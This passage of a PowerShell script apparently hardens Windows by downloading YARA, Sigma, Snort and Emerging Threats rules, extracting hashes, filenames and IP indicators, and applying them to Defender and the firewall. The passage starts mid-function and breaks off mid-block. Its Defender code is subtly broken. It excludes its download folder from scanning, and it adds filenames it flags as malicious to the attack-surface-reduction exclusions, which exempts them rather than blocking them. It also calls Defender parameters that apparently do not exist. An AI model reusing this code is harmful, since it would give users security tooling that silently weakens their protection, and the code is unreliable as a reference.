            Write-Log "Error checking update for ${Uri}: $_ (Status: $($_.Exception.Response.StatusCode))" -EntryType "Warning"
            
            if ($attempt -ge $MaxRetries) {
                return $true
            }
            
            # Exponential backoff
            Start-Sleep -Seconds $delay
            $delay *= 2
        }
    }
    return $true
}

# Get latest YARA Forge release URL
function Get-YaraForgeUrl {
    try {
        $releases = Invoke-WebRequest -Uri "https://api.github.com/repos/YARAHQ/yara-forge/releases" -UseBasicParsing
        $latest = ($releases.Content | ConvertFrom-Json)[0]
        $asset = $latest.assets | Where-Object { $_.name -match "yara-forge-.*-full\.zip|rules-full\.zip" } | Select-Object -First 1
        if ($asset) {
            Write-Log "Found YARA Forge release: $($asset.name)"
            return $asset.browser_download_url
        }
        Write-Log "No valid YARA Forge full zip found" -EntryType "Warning"
        return $null
    }
    catch {
        Write-Log "Error fetching YARA Forge release: $_" -EntryType "Warning"
        return $null
    }
}

# Count individual YARA rules in a file
function Get-YaraRuleCount {
    param ([string]$FilePath)
    try {
        if (-not (Test-Path $FilePath)) { return 0 }
        $content = Get-Content $FilePath -Raw
        $ruleMatches = [regex]::Matches($content, 'rule\s+\w+\s*\{')
        return $ruleMatches.Count
    }
    catch {
        Write-Log "Error counting rules in ${FilePath}: $_" -EntryType "Warning"
        return 0
    }
}

# Improved web request with retry and exponential backoff
function Invoke-WebRequestWithRetry {
    param (
        [string]$Uri, 
        [string]$OutFile, 
        [int]$MaxRetries = 3,
        [int]$InitialDelay = 5,
        [switch]$UseExponentialBackoff
    )
    
    $attempt = 0
    $delay = $InitialDelay
    
    while ($attempt -lt $MaxRetries) {
        try {
            Write-Log "Downloading ${Uri} (Attempt $(${attempt}+1))..."
            Invoke-WebRequest -Uri $Uri -OutFile $OutFile -TimeoutSec 30 -UseBasicParsing
            return $true
        }
        catch {
            $attempt++
            $statusCode = if ($_.Exception.Response) { $_.Exception.Response.StatusCode } else { "Unknown" }
            Write-Log "Download attempt $attempt for ${Uri} failed: $_ (Status: $statusCode)" -EntryType "Warning"
            
            if ($attempt -eq $MaxRetries) { 
                return $false 
            }
            
            # Apply backoff
            Start-Sleep -Seconds $delay
            if ($UseExponentialBackoff) {
                $delay *= 2
            }
        }
    }
    return $false
}

# Download and verify YARA, Sigma, and Snort rules
function Get-SecurityRules {
    param ($Config)
    
    $tempDir = "$env:TEMP\security_rules"
    if (-not (Test-Path $tempDir)) { New-Item -ItemType Directory -Path $tempDir -Force | Out-Null }
    $successfulSources = @()
    $rules = @{ Yara = @(); Sigma = @(); Snort = @() }

    try {
        Add-MpPreference -ExclusionPath $tempDir
        Write-Log "Added Defender exclusion for $tempDir"

        # YARA Forge rules
        Write-Log "Processing YARA Forge rules..."
        $yaraForgeDir = "$tempDir\yara_forge"
        $yaraForgeZip = "$tempDir\yara_forge.zip"
        if (-not (Test-Path $yaraForgeDir)) { New-Item -ItemType Directory -Path $yaraForgeDir -Force | Out-Null }
        $yaraForgeUri = Get-YaraForgeUrl
        $yaraRuleCount = 0
        
        if (-not $yaraForgeUri) {
            Write-Log "YARA Forge URL unavailable, trying fallback..." -EntryType "Warning"
        }
        elseif (Test-Url -Uri $yaraForgeUri) {
            if (Test-RuleSourceUpdated -Uri $yaraForgeUri -LocalFile $yaraForgeZip) {
                if (Invoke-WebRequestWithRetry -Uri $yaraForgeUri -OutFile $yaraForgeZip -UseExponentialBackoff) {
                    Start-MpScan -ScanPath $yaraForgeZip -ScanType CustomScan
                    Expand-Archive -Path $yaraForgeZip -DestinationPath $yaraForgeDir -Force
                    Write-Log "Downloaded and extracted YARA Forge rules"
                    $rules.Yara = Get-ChildItem -Path $yaraForgeDir -Recurse -Include "*.yar","*.yara" -ErrorAction SilentlyContinue
                    foreach ($file in $rules.Yara) {
                        $yaraRuleCount += Get-YaraRuleCount -FilePath $file.FullName
                    }
                    Write-Log "Found $($rules.Yara.Count) YARA Forge files with $yaraRuleCount individual rules in $yaraForgeDir"
                    $successfulSources += "YARA Forge"
                } else {
                    Write-Log "Failed to download YARA Forge rules after retries, trying fallback..." -EntryType "Warning"
                }
            } else {
                Write-Log "YARA Forge rules are up to date"
                $rules.Yara = Get-ChildItem -Path $yaraForgeDir -Recurse -Include "*.yar","*.yara" -ErrorAction SilentlyContinue
                foreach ($file in $rules.Yara) {
                    $yaraRuleCount += Get-YaraRuleCount -FilePath $file.FullName
                }
                Write-Log "Found $($rules.Yara.Count) YARA Forge files with $yaraRuleCount individual rules in $yaraForgeDir"
                $successfulSources += "YARA Forge"
            }
        } else {
            Write-Log "YARA Forge URL is invalid, trying fallback..." -EntryType "Warning"
        }

        # Yara-Rules fallback
        if (-not ($successfulSources -contains "YARA Forge") -or $yaraRuleCount -lt 10) {
            Write-Log "Processing Yara-Rules as fallback due to low YARA Forge rule count ($yaraRuleCount)..."
            $yaraRulesDir = "$tempDir\yara_rules"
            $yaraRulesZip = "$tempDir\yara_rules.zip"
            if (-not (Test-Path $yaraRulesDir)) { New-Item -ItemType Directory -Path $yaraRulesDir -Force | Out-Null }
            $yaraRulesUri = $Config.Sources.YaraRules
            
            if (Test-Url -Uri $yaraRulesUri) {
                if (Test-RuleSourceUpdated -Uri $yaraRulesUri -LocalFile $yaraRulesZip) {
                    if (Invoke-WebRequestWithRetry -Uri $yaraRulesUri -OutFile $yaraRulesZip -UseExponentialBackoff) {
                        Start-MpScan -ScanPath $yaraRulesZip -ScanType CustomScan
                        Expand-Archive -Path $yaraRulesZip -DestinationPath $yaraRulesDir -Force
                        Write-Log "Downloaded and extracted Yara-Rules"
                        $yaraRulesFiles = Get-ChildItem -Path $yaraRulesDir -Recurse -Include "*.yar","*.yara" -ErrorAction SilentlyContinue
                        $rules.Yara += $yaraRulesFiles
                        $yaraRuleCount = 0
                        foreach ($file in $yaraRulesFiles) {
                            $yaraRuleCount += Get-YaraRuleCount -FilePath $file.FullName
                        }
                        Write-Log "Found $($yaraRulesFiles.Count) Yara-Rules files with $yaraRuleCount individual rules in $yaraRulesDir"
                        $successfulSources += "Yara-Rules"
                    } else {
                        Write-Log "Failed to download Yara-Rules after retries, skipping..." -EntryType "Warning"
                    }
                } else {
                    Write-Log "Yara-Rules are up to date"
                    $yaraRulesFiles = Get-ChildItem -Path $yaraRulesDir -Recurse -Include "*.yar","*.yara" -ErrorAction SilentlyContinue
                    $rules.Yara += $yaraRulesFiles
                    $yaraRuleCount = 0
                    foreach ($file in $yaraRulesFiles) {
                        $yaraRuleCount += Get-YaraRuleCount -FilePath $file.FullName
                    }
                    Write-Log "Found $($yaraRulesFiles.Count) Yara-Rules files with $yaraRuleCount individual rules in $yaraRulesDir"
                    $successfulSources += "Yara-Rules"
                }
            } else {
                Write-Log "Yara-Rules URL is invalid, skipping..." -EntryType "Warning"
            }
        }

        # SigmaHQ rules
        Write-Log "Processing SigmaHQ rules..."
        $sigmaDir = "$tempDir\sigma"
        $sigmaZip = "$tempDir\sigma_rules.zip"
        if (-not (Test-Path $sigmaDir)) { New-Item -ItemType Directory -Path $sigmaDir -Force | Out-Null }
        $sigmaUri = $Config.Sources.SigmaHQ
        
        if (Test-Url -Uri $sigmaUri) {
            if (Test-RuleSourceUpdated -Uri $sigmaUri -LocalFile $sigmaZip) {
                if (Invoke-WebRequestWithRetry -Uri $sigmaUri -OutFile $sigmaZip -UseExponentialBackoff) {
                    Start-MpScan -ScanPath $sigmaZip -ScanType CustomScan
                    Expand-Archive -Path $sigmaZip -DestinationPath $sigmaDir -Force
                    Write-Log "Downloaded and extracted SigmaHQ rules"
                    $successfulSources += "SigmaHQ"
                } else {
                    Write-Log "Failed to download SigmaHQ rules after retries, skipping..." -EntryType "Warning"
                }
            } else {
                Write-Log "SigmaHQ rules are up to date"
                $successfulSources += "SigmaHQ"
            }
        } else {
            Write-Log "SigmaHQ URL is invalid, skipping..." -EntryType "Warning"
        }
        
        $sigmaRulesPath = "$sigmaDir\sigma-master\rules"
        if (Test-Path $sigmaRulesPath) {
            $rules.Sigma = Get-ChildItem -Path $sigmaRulesPath -Recurse -Include "*.yml" -Exclude "*deprecated*" -ErrorAction SilentlyContinue
            Write-Log "Found $($rules.Sigma.Count) Sigma rules in $sigmaRulesPath"
        } else {
            Write-Log "Sigma rules directory $sigmaRulesPath does not exist" -EntryType "Warning"
        }

        # Snort Community rules
        Write-Log "Processing Snort Community rules..."
        $snortRules = "$tempDir\snort_community.rules"
        $snortUri = if ($SnortOinkcode) {
            "$($Config.Sources.SnortCommunity)?oinkcode=$SnortOinkcode"
        } else {
            Write-Log "No Snort Oinkcode provided. Snort Community rules require an Oinkcode from https://www.snort.org/users/sign_up" -EntryType "Warning"
            $null
        }
        
        if ($snortUri -and (Test-Url -Uri $snortUri)) {
            if (Test-RuleSourceUpdated -Uri $snortUri -LocalFile $snortRules) {
                if (Invoke-WebRequestWithRetry -Uri $snortUri -OutFile $snortRules -UseExponentialBackoff) {
                    Start-MpScan -ScanPath $snortRules -ScanType CustomScan
                    try {
                        Write-Log "Checking Snort Community hash..."
                        $snortPage = Invoke-WebRequest -Uri "https://www.snort.org/downloads" -UseBasicParsing -TimeoutSec 15
                        if ($snortPage.Content -match 'community-rules\.tar\.gz\.md5.*([a-f0-9]{32})') {
                            $expectedHash = $matches[1]
                            $fileHash = (Get-FileHash -Path $snortRules -Algorithm MD5).Hash
                            if ($fileHash -ne $expectedHash) {
                                Write-Log "Snort Community rules hash mismatch!" -EntryType "Error"
                                throw "Snort Community rules hash verification failed"
                            }
                            Write-Log "Snort Community rules hash verified"
                        } else {
                            Write-Log "Snort Community hash not found, proceeding without verification" -EntryType "Warning"
                        }
                    }
                    catch {
                        Write-Log "Error checking Snort Community hash: $_" -EntryType "Warning"
                    }
                    Write-Log "Downloaded Snort Community rules"
                    $successfulSources += "Snort Community"
                    $rules.Snort += $snortRules
                } else {
                    Write-Log "Failed to download Snort Community rules after retries, trying fallback..." -EntryType "Warning"
                }
            } else {
                Write-Log "Snort Community rules are up to date"
                $successfulSources += "Snort Community"
                $rules.Snort += $snortRules
            }
        } else {
            Write-Log "Snort Community URL is invalid or no Oinkcode provided, trying fallback..." -EntryType "Warning"
        }

        # Emerging Threats fallback
        if (-not ($successfulSources -contains "Snort Community")) {
            Write-Log "Processing Emerging Threats rules as fallback..."
            $emergingRules = "$tempDir\snort_emerging.rules"
            $emergingUri = $Config.Sources.EmergingThreats
            $emergingTar = "$tempDir\emerging_rules.tar.gz"
            
            if (Test-Url -Uri $emergingUri) {
                if (Test-RuleSourceUpdated -Uri $emergingUri -LocalFile $emergingTar) {
                    if (Invoke-WebRequestWithRetry -Uri $emergingUri -OutFile $emergingTar -UseExponentialBackoff) {
                        Start-MpScan -ScanPath $emergingTar -ScanType CustomScan
                        try {
                            $hashUri = "https://rules.emergingthreats.net/open/snort-3.0.0/emerging.rules.tar.gz.md5"
                            $hashResponse = Invoke-WebRequest -Uri $hashUri -UseBasicParsing -TimeoutSec 15
                            if ($hashResponse.Content -match '([a-f0-9]{32})') {
                                $expectedHash = $matches[1]
                                $fileHash = (Get-FileHash -Path $emergingTar -Algorithm MD5).Hash
                                if ($fileHash -ne $expectedHash) {
                                    Write-Log "Emerging Threats rules hash mismatch!" -EntryType "Error"
                                    throw "Emerging Threats rules hash verification failed"
                                }
                                Write-Log "Emerging Threats rules hash verified"
                            } else {
                                Write-Log "Emerging Threats hash not found, proceeding without verification" -EntryType "Warning"
                            }
                        }
                        catch {
                            Write-Log "Error checking Emerging Threats hash: $_" -EntryType "Warning"
                        }
                        
                        # Extract tar.gz file
                        try {
                            tar -xzf $emergingTar -C $tempDir
                            if (Test-Path "$tempDir\rules") {
                                Move-Item -Path "$tempDir\rules\*.rules" -Destination $emergingRules -Force
                                Write-Log "Downloaded and extracted Emerging Threats rules"
                                $successfulSources += "Emerging Threats"
                                $rules.Snort += $emergingRules
                            } else {
                                Write-Log "Emerging Threats extraction failed: rules directory not found" -EntryType "Warning"
                            }
                        }
                        catch {
                            Write-Log "Error extracting Emerging Threats rules: $_" -EntryType "Warning"
                        }
                    } else {
                        Write-Log "Failed to download Emerging Threats rules after retries, skipping..." -EntryType "Warning"
                    }
                } else {
                    Write-Log "Emerging Threats rules are up to date"
                    $successfulSources += "Emerging Threats"
                    $rules.Snort += $emergingRules
                }
            } else {
                Write-Log "Emerging Threats URL is invalid, skipping..." -EntryType "Warning"
            }
        }

        if ($successfulSources.Count -eq 0) {
            Write-Log "No rule sources were successfully processed!" -EntryType "Error"
            throw "No valid rule sources available"
        }
        
        Write-Log "Successfully processed rules from: $($successfulSources -join ', ')"
        return $rules
    }
    catch {
        Write-Log "Error in Get-SecurityRules: $_" -EntryType "Error"
        return $rules
    }
}

# Parse rules for actionable indicators - FIXED VERSION
function Parse-Rules {
    param (
        $Rules,
        $Config
    )

    $indicators = @()
    $batchSize = 1000
    $systemFiles = $Config.ExcludedSystemFiles
    $debugSamples = @()
    $isDebug = $DebugMode -or (-not (Test-Path "$env:TEMP\security_rules\debug_done.txt"))

    if ($isDebug -and -not $DebugMode) {
        Write-Log "Debug mode enabled for first run to capture unmatched rule samples"
    }

    # YARA rule parsing - FIXED
    Write-Log "Parsing YARA rules..."
    $yaraCount = $Rules.Yara.Count
    $processed = 0
    $yaraBatches = [math]::Ceiling($yaraCount / $batchSize)
    
    for ($i = 0; $i -lt $yaraBatches; $i++) {
        $batch = $Rules.Yara | Select-Object -Skip ($i * $batchSize) -First $batchSize
        foreach ($rule in $batch) {
            try {
                if (-not (Test-Path $rule.FullName)) { continue }
                $content = Get-Content $rule.FullName -Raw -ErrorAction Stop
                
                # Fixed hash extraction - simplified quote matching
                $hashPatterns = @(
                    "(?i)meta:.*?(md5|hash)\s*=\s*(\""|')([a-f0-9]{32})(\""|')",
                    "(?i)meta:.*?(sha1|hash1)\s*=\s*(\""|')([a-f0-9]{40})(\""|')",
                    "(?i)meta:.*?(sha256|hash256)\s*=\s*(\""|')([a-f0-9]{64})(\""|')",
                    "(?i)\$[a-z0-9_]*\s*=\s*(\""|')([a-f0-9]{32,64})(\""|').*?\/\*\s*(md5|sha1|sha256)\s*\*\/"
                )
                
                foreach ($pattern in $hashPatterns) {
                    $matches = [regex]::Matches($content, $pattern)
                    foreach ($match in $matches) {
                        $hash = $match.Groups[3].Value
                        $indicators += @{ Type = "Hash"; Value = $hash; Source = "YARA"; RuleFile = $rule.Name }
                        Write-Log "Found YARA hash: $hash in $($rule.FullName)"
                    }
                }
                
                # Improved filename extraction
                $filenamePatterns = @(
                    "(?i)meta:.*?(filename|file_name|original_filename)\s*=\s*(\""|')([^\""']+\.(exe|dll|bat|ps1|scr|cmd))(\""|')",
                    "(?i)\$[a-z0-9_]*\s*=\s*(\""|')([^\""']*\.(exe|dll|bat|ps1|scr|cmd))(\""|')",
                    "(?i)fullword\s+ascii\s+(\""|')([^\""']*\.(exe|dll|bat|ps1|scr|cmd))(\""|')"
                )
                
                foreach ($pattern in $filenamePatterns) {
                    $matches = [regex]::Matches($content, $pattern)
                    foreach ($match in $matches) {
                        $fileName = $match.Groups[3].Value -replace '\\\\', '\'
                        $baseFileName = [System.IO.Path]::GetFileName($fileName)
                        if ($baseFileName -and $baseFileName -notin $systemFiles) {
                            $indicators += @{ Type = "FileName"; Value = $baseFileName; Source = "YARA"; RuleFile = $rule.Name }
                            Write-Log "Found YARA filename: $baseFileName in $($rule.FullName)"
                        }
                    }
                }
                
                # Extract domains and URLs
                $domainPatterns = @(
                    "(?i)meta:.*?(domain|url|c2|command_and_control)\s*=\s*(\""|')([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})(\""|')",
                    "(?i)\$[a-z0-9_]*\s*=\s*(\""|')https?://([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})(\""|')",
                    "(?i)fullword\s+ascii\s+(\""|')https?://([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})(\""|')"
                )
                
                foreach ($pattern in $domainPatterns) {
                    $matches = [regex]::Matches($content, $pattern)
                    foreach ($match in $matches) {
                        $domain = $match.Groups[3].Value
                        $indicators += @{ Type = "Domain"; Value = $domain; Source = "YARA"; RuleFile = $rule.Name }
                        Write-Log "Found YARA domain: $domain in $($rule.FullName)"
                    }
                }
                
                # Debug unmatched rules
                if ($isDebug -and -not ($indicators | Where-Object { $_.Source -eq "YARA" -and $_.RuleFile -eq $rule.Name })) {
                    $sample = $content -split '\n' | Select-Object -First 10
                    $debugSamples += "YARA rule $($rule.FullName) no match:`n$($sample -join '`n')`n"
                }
                
                $processed++
                if ($processed % 25 -eq 0 -or $processed -eq $yaraCount) {
                    Write-Log "Processed $processed/$yaraCount YARA rules"
                }
            }
            catch {
                Write-Log "Error parsing YARA rule $($rule.FullName): $_" -EntryType "Warning"
            }
        }
    }
    
    if ($indicators.Where({$_.Source -eq "YARA"}).Count -eq 0) {
        Write-Log "No indicators extracted from YARA rules" -EntryType "Warning"
        if ($isDebug -and $debugSamples) {
            $debugSamplesFile = "$env:TEMP\security_rules\yara_debug_samples.txt"
            $debugSamples | Out-File -FilePath $debugSamplesFile -Encoding UTF8
            Write-Log "Debug: Saved unmatched YARA rule samples to $debugSamplesFile" -EntryType "Warning"
        }
    }

    # Sigma rule parsing
    Write-Log "Parsing Sigma rules..."
    $sigmaCount = $Rules.Sigma.Count
    $processed = 0
    $sigmaBatches = [math]::Ceiling($sigmaCount / $batchSize)
    $yamlModule = Get-Module -ListAvailable -Name PowerShell-YAML
    
    for ($i = 0; $i -lt $sigmaBatches; $i++) {
        $batch = $Rules.Sigma | Select-Object -Skip ($i * $batchSize) -First $batchSize
        foreach ($rule in $batch) {
            try {
                if (-not (Test-Path $rule.FullName)) { continue }
                $content = Get-Content $rule.FullName -Raw -ErrorAction Stop
                $fileNames = @()
                
                if ($yamlModule) {
                    # Parse YAML if module is available
                    $yaml = ConvertFrom-Yaml -Yaml $content -ErrorAction Stop
                    
                    # Check detection section
                    if ($yaml.detection) {
                        # Process selection criteria
                        foreach ($selectionKey in $yaml.detection.Keys) {
                            $selection = $yaml.detection[$selectionKey]
                            if ($selection -is [hashtable] -or $selection -is [System.Collections.Specialized.OrderedDictionary]) {
                                foreach ($key in @('Image', 'TargetFilename', 'CommandLine', 'ParentImage', 'OriginalFileName', 'ProcessName', 'FileName')) {
                                    $value = $selection[$key]
                                    if ($value -is [string] -and $value -match '\.(exe|dll|bat|ps1|scr|cmd)$') {
                                        $fileName = [System.IO.Path]::GetFileName($value)
                                        if ($fileName -and $fileName -notin $systemFiles) {
                                            $fileNames += $fileName
                                        }
                                    }
                                    elseif ($value -is [array]) {
                                        foreach ($item in $value) {
                                            if ($item -is [string] -and $item -match '\.(exe|dll|bat|ps1|scr|cmd)$') {
                                                $fileName = [System.IO.Path]::GetFileName($item)
                                                if ($fileName -and $fileName -notin $systemFiles) {
                                                    $fileNames += $fileName
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                } 
                else {
                    # Fallback to regex if YAML module is not available
                    $filenamePatterns = @(
                        "(?i)(Image|TargetFilename|CommandLine|ParentImage|OriginalFileName|ProcessName|FileName):\s*['""]?.*?\\([^\s\\|]+?\.(exe|dll|bat|ps1|scr|cmd))['""]?",
                        "(?i)(Image|TargetFilename|CommandLine|ParentImage|OriginalFileName|ProcessName|FileName):\s*['""]?([^\s\\|/]+?\.(exe|dll|bat|ps1|scr|cmd))['""]?"
                    )
                    
                    foreach ($pattern in $filenamePatterns) {
                        if ($content -match $pattern) {
                            $fileName = $matches[2]
                            if ($fileName -and $fileName -notin $systemFiles) {
                                $fileNames += $fileName
                            }
                        }
                    }
                }
                
                # Add unique filenames to indicators
                $fileNames = $fileNames | Select-Object -Unique
                foreach ($fileName in $fileNames) {
                    $indicators += @{ Type = "FileName"; Value = $fileName; Source = "Sigma"; RuleFile = $rule.Name }
                    Write-Log "Found Sigma filename: $fileName in $($rule.FullName)"
                }
                
                # Debug unmatched rules
                if ($isDebug -and -not $fileNames) {
                    $sample = $content -split '\n' | Select-Object -First 10
                    $debugSamples += "Sigma rule $($rule.FullName) no match:`n$($sample -join '`n')`n"
                }
                
                $processed++
                if ($processed % 1000 -eq 0 -or $processed -eq $sigmaCount) {
                    Write-Log "Processed $processed/$sigmaCount Sigma rules"
                }
            }
            catch {
                Write-Log "Error parsing Sigma rule $($rule.FullName): $_" -EntryType "Warning"
            }
        }
    }
    
    if ($indicators.Where({$_.Source -eq "Sigma"}).Count -eq 0) {
        Write-Log "No indicators extracted from Sigma rules" -EntryType "Warning"
        if ($isDebug -and $debugSamples) {
            $debugSamplesFile = "$env:TEMP\security_rules\sigma_debug_samples.txt"
            $debugSamples | Out-File -FilePath $debugSamplesFile -Encoding UTF8
            Write-Log "Debug: Saved unmatched Sigma rule samples to $debugSamplesFile" -EntryType "Warning"
        }
    }

    # Snort rule parsing
    Write-Log "Parsing Snort rules..."
    $totalIPs = 0
    $totalDomains = 0
    $ipList = @()
    $domainList = @()
    
    foreach ($snortFile in $Rules.Snort) {
        if (Test-Path $snortFile) {
            try {
                $lines = Get-Content $snortFile -ErrorAction Stop
                $lineCount = $lines.Count
                $processed = 0
                
                for ($i = 0; $i -lt $lineCount; $i++) {
                    $line = $lines[$i]
                    
                    # Extract IPs from traditional format
                    if ($line -match '(?:^|\s)(?:alert|log|pass|drop|reject|sdrop)\s+\w+\s+(?:\$\w+\s+)?(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(?:/\d{1,2})?\s+\w+\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(?:/\d{1,2})?') {
                        $srcIp = $matches[1]
                        $dstIp = $matches[2]
                        
                        foreach ($ip in @($srcIp, $dstIp)) {
                            if ($ip -notmatch "^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|127\.|0\.)") {
                                $ipList += @{ Type = "IP"; Value = $ip; Source = "Snort"; RuleFile = [System.IO.Path]::GetFileName($snortFile) }
                                $totalIPs++
                                Write-Log "Found Snort IP: $ip in $snortFile"
                            }
                        }
                    }
                    
                    # Extract IPs from Emerging Threats format (e.g., [IP1,IP2,...])
                    if ($line -match '\[((\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?:,\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})*))\]') {
                        $ipString = $matches[1]
                        $ips = $ipString -split ',' | ForEach-Object { $_.Trim() }
                        foreach ($ip in $ips) {
                            if ($ip -match '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$' -and $ip -notmatch "^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|127\.|0\.)") {
                                $ipList += @{ Type = "IP"; Value = $ip; Source = "Snort"; RuleFile = [System.IO.Path]::GetFileName($snortFile) }
                                $totalIPs++
                                Write-Log "Found Snort IP: $ip in $snortFile (Emerging Threats format)"
                            }
                        }
                    }
                    
                    # Extract domains
                    if ($line -match "content:.*?(\""|')([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})(\""|')") {
                        $domain = $matches[2]
                        $domainList += @{ Type = "Domain"; Value = $domain; Source = "Snort"; RuleFile = [System.IO.Path]::GetFileName($snortFile) }
                        $totalDomains++
                        Write-Log "Found Snort domain: $domain in $snortFile"
                    }
                    
                    $processed++
                    if ($processed % 250 -eq 0) {
                        Write-Log "Processed $processed/$lineCount lines in ${snortFile}"
                    }
                }
                
                Write-Log "Completed parsing $processed/$lineCount lines in ${snortFile}"
            }
            catch {
                Write-Log "Error parsing Snort file ${snortFile}: $_" -EntryType "Warning"
            }
        } else {
            Write-Log "Snort file ${snortFile} does not exist" -EntryType "Warning"
        }
    }
    
    # Add unique IPs and domains
    $indicators += $ipList
    $indicators += $domainList
    
    $uniqueIPs = ($ipList | Select-Object -Property Value -Unique).Count
    $uniqueDomains = ($domainList | Select-Object -Property Value -Unique).Count
    
    Write-Log "Extracted $totalIPs total IPs ($uniqueIPs unique), $totalDomains domains ($uniqueDomains unique) from Snort rules"
    
    if ($indicators.Where({$_.Source -eq "Snort"}).Count -eq 0) {
        Write-Log "No indicators extracted from Snort rules" -EntryType "Warning"
    }

    # Log all indicators before deduplication
    Write-Log "All indicators before deduplication: $($indicators.Count) total"
    
    # Improved deduplication that preserves source information
    $uniqueIndicators = @()
    $indicators | Group-Object -Property Type, Value | ForEach-Object {
        $uniqueIndicator = $_.Group[0]
        if ($_.Group[0].PSObject.Properties.Name -contains "Source") {
            $sources = ($_.Group | Select-Object -ExpandProperty Source -Unique) -join ','
            $uniqueIndicator.Source = $sources
        } else {
            $uniqueIndicator | Add-Member -NotePropertyName "Source" -NotePropertyValue "Unknown" -Force
        }
        $uniqueIndicators += $uniqueIndicator
    }
    
    Write-Log "Parsed $($uniqueIndicators.Count) unique indicators from rules (Hashes: $($uniqueIndicators.Where({$_.Type -eq 'Hash'}).Count), Files: $($uniqueIndicators.Where({$_.Type -eq 'FileName'}).Count), IPs: $($uniqueIndicators.Where({$_.Type -eq 'IP'}).Count), Domains: $($uniqueIndicators.Where({$_.Type -eq 'Domain'}).Count))."

    if ($isDebug -and -not $DebugMode) {
        New-Item -Path "$env:TEMP\security_rules\debug_done.txt" -ItemType File -Force | Out-Null
    }
    
    return $uniqueIndicators
}

# Apply rules to Windows Defender ASR, Firewall, and Custom Threats
function Apply-SecurityRules {
    param (
        $Indicators,
        $Config
    )

    Write-Log "Applying security rules..."
    
    # Clean up existing firewall and custom threat rules
    try {
        $existingFirewallRules = Get-NetFirewallRule -Name "Block_C2_*" -ErrorAction SilentlyContinue
        if ($existingFirewallRules) {
            $existingFirewallRules | Remove-NetFirewallRule -ErrorAction SilentlyContinue
            Write-Log "Removed $($existingFirewallRules.Count) existing firewall rules"
        }
        
        # Remove existing custom threat definitions
        $existingThreats = Get-MpThreatDetection | Where-Object { $_.ThreatName -like "GSecurity_*" }
        foreach ($threat in $existingThreats) {
            try {
                Remove-MpThreat -ThreatID $threat.ThreatID -ErrorAction SilentlyContinue
                Write-Log "Removed existing custom threat: $($threat.ThreatName)"
            }
            catch {
                Write-Log "Error removing custom threat $($threat.ThreatName): $_" -EntryType "Warning"
            }
        }
    }
    catch {
        Write-Log "Error cleaning up existing rules: $_" -EntryType "Warning"
    }
    
    # Apply custom threat definitions for hashes
    $hashIndicators = $Indicators | Where-Object { $_.Type -eq "Hash" }
    $hashCount = $hashIndicators.Count
    $processedHash = 0
    
    foreach ($indicator in $hashIndicators) {
        try {
            $hash = $indicator.Value
            $threatName = "GSecurity_Hash_$hash"
            $description = "Malicious file hash detected from $($indicator.Source) rules"
            
            # Create a temporary file with the hash for Windows Defender to process
            $tempFile = "$env:TEMP\GSecurity_threat_$hash.txt"
            $hash | Out-File -FilePath $tempFile -Encoding ASCII
            
            # Add the hash as a custom threat
            Add-MpPreference -ThreatIDDefaultAction_Actions Block -ThreatIDDefaultAction_Ids $threatName
            Add-MpPreference -SubmissionFile $tempFile
            Write-Log "Added custom threat for hash: $hash"
            $processedHash++
            
            # Clean up
            Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue
        }
        catch {
            Write-Log "Error applying custom threat for hash $($indicator.Value): $_" -EntryType "Warning"
        }
    }
    
    # Apply ASR rules for suspicious filenames
    $fileIndicators = $Indicators | Where-Object { $_.Type -eq "FileName" }
    $asrCount = $fileIndicators.Count
    $processedAsr = 0
    
    # Configure the predefined ASR rule (optional, for broader protection)
    $asrRuleId = "e6db77e5-3df2-4cf1-b95a-636979351e5b" # Block executable files unless trusted
    try {
        $asrRules = Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids -ErrorAction SilentlyContinue
        $asrActions = Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Actions -ErrorAction SilentlyContinue
        
        $asrIndex = $null
        if ($asrRules) {
            $asrIndex = $asrRules.IndexOf($asrRuleId)
        }
        
        if ($asrIndex -ge 0) {
            if ($asrActions[$asrIndex] -ne 1) {
                Add-MpPreference -AttackSurfaceReductionRules_Ids $asrRuleId -AttackSurfaceReductionRules_Actions Enabled
                Write-Log "Enabled existing ASR rule $asrRuleId"
            }
        }
        else {
            Add-MpPreference -AttackSurfaceReductionRules_Ids $asrRuleId -AttackSurfaceReductionRules_Actions Enabled
            Write-Log "Added and enabled ASR rule $asrRuleId"
        }
    }
    catch {
        Write-Log "Error configuring ASR rule: $_" -EntryType "Warning"
    }
    
    # Add filename-based custom threats
    foreach ($indicator in $fileIndicators) {
        try {
            $fileName = $indicator.Value
            $threatName = "GSecurity_File_$([System.IO.Path]::GetFileNameWithoutExtension($fileName))"
            $description = "Malicious filename detected from $($indicator.Source) rules"
            
            # Add the filename as a custom threat
            Add-MpPreference -ThreatIDDefaultAction_Actions Block -ThreatIDDefaultAction_Ids $threatName
            Add-MpPreference -AttackSurfaceReductionOnlyExclusions $fileName
            Write-Log "Added custom threat and ASR exclusion for filename: $fileName"
            $processedAsr++
        }
        catch {
            Write-Log "Error applying custom threat for filename $($indicator.Value): $_" -EntryType "Warning"
        }
    }

    # Apply firewall rules for malicious IPs in batches
    $ipIndicators = $Indicators | Where-Object { $_.Type -eq "IP" }
    $ipCount = $ipIndicators.Count
    $processedIp = 0
    $batchSize = $Config.FirewallBatchSize
    
    for ($i = 0; $i -lt $ipCount; $i += $batchSize) {
        $batch = $ipIndicators | Select-Object -Skip $i -First $batchSize
        $batchIPs = $batch | ForEach-Object { $_.Value }
        
        if ($batchIPs.Count -gt 0) {
            try {
                $batchName = "Block_C2_Batch_$($i / $batchSize)"
                New-NetFirewallRule -Name $batchName -DisplayName $batchName -Direction Outbound -Action Block `
                                   -RemoteAddress $batchIPs -ErrorAction Stop
                $processedIp += $batchIPs.Count
                Write-Log "Created batch firewall rule $batchName with $($batchIPs.Count) IPs"
            }
            catch {
